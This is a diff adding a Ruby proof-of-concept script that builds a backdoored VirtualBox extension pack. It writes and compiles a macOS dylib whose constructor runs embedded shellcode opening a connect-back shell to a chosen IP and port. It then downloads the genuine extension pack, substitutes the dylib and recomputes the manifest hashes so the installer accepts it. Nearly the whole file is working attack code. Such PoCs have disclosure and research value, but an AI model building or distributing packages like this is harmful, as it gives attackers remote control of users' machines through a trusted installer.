@@ -1,0 +1,164 @@
+#!/usr/bin/env ruby
+
+# RCE PoC builder for VirtualBox extension packs
+# Tested with version 5.2.2 on 30/11/17
+#
+# Discovered by m4rkw, shouts to #coolkids
+# PoC is for darwin.amd64 but other architectures are likely vulnerable
+#
+# This builds a backdoored extension pack which VirtualBox will happily install.
+# Once installed, when an OSX/64bit VM is started it will trigger the shellcode
+# and initiate a connectback shell.
+#
+# Thanks to Jacob Hammack for the shellcode
+
+require 'digest'
+
+puts
+puts "RCE PoC builder for VirtualBox extension pack"
+puts "discovered by m4rkw, shouts to #coolkids"
+puts
+puts "PoC is for darwin.amd64 but other architectures may be vulnerable"
+puts
+puts "This builds a backdoored extension pack which VirtualBox will happily install."
+puts "Once installed, when any VM is started it will trigger the shellcode and"
+puts "initiate a connectback shell to the specified IP and port"
+puts
+puts "Thanks to Jacob Hammack for the shellcode"
+puts
+
+if ARGV.length < 2
+  puts "Usage: #{__FILE__} <ip> <port>"
+  puts
+  exit 0
+end
+
+target_dylib = "VBoxEhciR3.dylib"
+
+puts "compiling attack.dylib..."
+
+File.open("attack.c","w") do |f|
+  f.write("#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+
+int (*sc)();
+
+char target_ip[] = \"#{ARGV[0]}\";
+short target_port = #{ARGV[1]};
+
+char shellcode[] =
+  \"\\x41\\xB0\\x02\\x49\\xC1\\xE0\\x18\\x49\\x83\\xC8\\x61\\x4C\\x89\\xC0\\x48\"
+  \"\\x31\\xD2\\x48\\x89\\xD6\\x48\\xFF\\xC6\\x48\\x89\\xF7\\x48\\xFF\\xC7\\x0F\"
+  \"\\x05\\x49\\x89\\xC4\\x49\\xBD\\x01\\x01\\x11\\x5C\\xFF\\xFF\\xFF\\xFF\\x41\"
+  \"\\xB1\\xFF\\x4D\\x29\\xCD\\x41\\x55\\x49\\x89\\xE5\\x49\\xFF\\xC0\\x4C\\x89\"
+  \"\\xC0\\x4C\\x89\\xE7\\x4C\\x89\\xEE\\x48\\x83\\xC2\\x10\\x0F\\x05\\x49\\x83\"
+  \"\\xE8\\x08\\x48\\x31\\xF6\\x4C\\x89\\xC0\\x4C\\x89\\xE7\\x0F\\x05\\x48\\x83\"
+  \"\\xFE\\x02\\x48\\xFF\\xC6\\x76\\xEF\\x49\\x83\\xE8\\x1F\\x4C\\x89\\xC0\\x48\"
+  \"\\x31\\xD2\\x49\\xBD\\xFF\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x49\\xC1\\xED\"
+  \"\\x08\\x41\\x55\\x48\\x89\\xE7\\x48\\x31\\xF6\\x0F\\x05\";
+
+__attribute__((constructor))
+void customConstructor(int argc, char **argv)
+{
+  struct in_addr ip;
+  char *tp = (char *)&target_port;
+
+  shellcode[38] = tp[1];
+  shellcode[39] = tp[0];
+
+  inet_aton(target_ip, (struct in_addr *)&ip);
+  memcpy((char *)&shellcode[40], (char *)&ip.s_addr, 4);
+
+  void *ptr = mmap(0, 0x33, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
+
+  if (ptr == MAP_FAILED) {
+    perror(\"mmap\");
+    exit(-1);
+  }
+  memcpy(ptr, shellcode, sizeof(shellcode));
+  sc = ptr;
+
+  sc();
+}
+")
+end
+
+system("clang -dynamiclib -std=gnu99 attack.c -o attack.dylib")
+File.delete("attack.c")
+
+if !File.exist? "vbox_exp_temp"
+  Dir.mkdir("vbox_exp_temp")
+end
+Dir.chdir("vbox_exp_temp")
+
+puts "looking for latest extpack at virtualbox.org..."
+
+downloads_html = `curl -s https://www.virtualbox.org/wiki/Downloads`
+
+match = downloads_html.match(/http:\/\/download\.virtualbox\.org\/virtualbox\/[\d\.]+\/Oracle_VM_VirtualBox_Extension_Pack[\d\.\-]+\.vbox-extpack/)
+
+if !match or !match[0]
+  puts "failed to find http:// link to the extpack."
+  exit 1
+end
+
+puts "downloading extpack... "
+
+filename = match[0].split("/")[-1]
+
+system("curl -s #{match[0]} -o #{filename}")
+
+puts "unpacking extpack... "
+
+system("tar zxf #{filename}")
+File.delete(filename)
+
+puts "substituting #{target_dylib}... "
+
+File.delete("darwin.amd64/#{target_dylib}")
+File.rename("../attack.dylib", "darwin.amd64/#{target_dylib}")
+
+puts "patching manifest... "
+
+File.open("ExtPack.manifest.new","w") do |f|
+  File.read("ExtPack.manifest").chomp.split("\n").each do |line|
+    r = target_dylib.gsub('.','\.')
+
+    if (match = line.match(/\A(MD5|SHA256|SHA512|SHA1|SIZE) \(darwin\.amd64\/#{r}\)/))
+      case match[1]
+      when "MD5"
+        md5 = Digest::MD5.hexdigest File.read("darwin.amd64/#{target_dylib}")
+        f.write("MD5 (darwin.amd64/#{target_dylib}) = #{md5}\n")
+      when "SHA256"
+        sha256 = Digest::SHA256.hexdigest File.read("darwin.amd64/#{target_dylib}")
+        f.write("SHA256 (darwin.amd64/#{target_dylib}) = #{sha256}\n")
+      when "SHA512"
+        sha512 = Digest::SHA512.hexdigest File.read("darwin.amd64/#{target_dylib}")
+        f.write("SHA512 (darwin.amd64/#{target_dylib}) = #{sha512}\n")
+      when "SHA1"
+        sha1 = Digest::SHA1.hexdigest File.read("darwin.amd64/#{target_dylib}")
+        f.write("SHA1 (darwin.amd64/#{target_dylib}) = #{sha1}\n")
+      when "SIZE"
+        size = File.size "darwin.amd64/#{target_dylib}"
+        f.write("SIZE (darwin.amd64/#{target_dylib}) = #{size}\n")
+      end
+    else
+      f.write(line + "\n")
+    end
+  end
+end
+
+File.delete("ExtPack.manifest")
+File.rename("ExtPack.manifest.new", "ExtPack.manifest")
+
+puts "creating tarball... "
+system("tar -zcf ../#{filename} *")
+
+Dir.chdir("..")
+system("rm -rf vbox_exp_temp")
+
+puts "\ncreated backdoored extpack: #{filename}\n\n"
